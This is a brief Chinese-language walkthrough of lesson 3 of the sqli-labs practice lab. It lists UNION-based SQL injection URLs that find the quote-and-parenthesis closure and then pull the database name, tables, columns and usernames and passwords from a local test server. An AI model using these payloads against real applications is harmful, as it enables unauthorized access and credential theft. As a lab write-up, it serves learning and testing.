---
title: Less - 03
date: 2023-03-13T12:49:42Z
lastmod: 2023-03-13T13:02:56Z
---

# Less - 03

---

# 通关教程

---

## 1、判断闭合

---

```http
http://127.0.0.1/sql1/Less-3/?id=1
http://127.0.0.1/sql1/Less-3/?id=1'
http://127.0.0.1/sql1/Less-3/?id=1')--+
```

​![image](assets/image-20230313125318-ybqqs7a.png)​

​![image](assets/image-20230313125438-63uxj84.png)​

## 2、查看当前数据库和用户

---

```http
http://192.168.225.132/sqli-labs/Less-3/?id=0') union select 1,database(),user()--+
```

​![image](assets/image-20230313125613-d5r3drk.png)​

## 3、查看数据表

---

```http
http://192.168.225.132/sqli-labs/Less-3/?id=0') union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')--+
```

​![image](assets/image-20230313125810-pk3jx5d.png)​

## 4、查看字段名

---

```http
http://192.168.225.132/sqli-labs/Less-3/?id=0') union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users')--+
```

​![image](assets/image-20230313125907-5ffgmcz.png)​

## 5、查看字段的值

---

```http
http://192.168.225.132/sqli-labs/Less-3/?id=0') union select 1,2,(select group_concat(username,password) from security.users)--+
```

​![image](assets/image-20230313130245-udy5u21.png)​

‍
